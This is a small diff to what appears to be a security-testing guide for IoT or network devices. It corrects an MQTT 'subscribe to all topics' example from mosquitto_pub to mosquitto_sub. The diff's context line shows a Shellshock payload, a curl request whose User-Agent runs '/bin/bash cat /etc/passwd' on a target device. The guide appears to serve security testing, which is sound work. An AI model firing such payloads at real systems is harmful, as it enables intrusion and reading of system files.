@@ -68,7 +68,7 @@ curl -k -H "User-Agent: () { :; }; /bin/bash cat /etc/passwd" http://<UWP IP>/
 #### Case 4: interaction with MQTT broker
 Subscribe to all topics:
 ```
-mosquitto_pub -h <MQTT broker IP> -t "#" [-u <username> -P <password>]
+mosquitto_sub -h <MQTT broker IP> -t "#" [-u <username> -P <password>]
 ```
 Publish a topic:
 ```
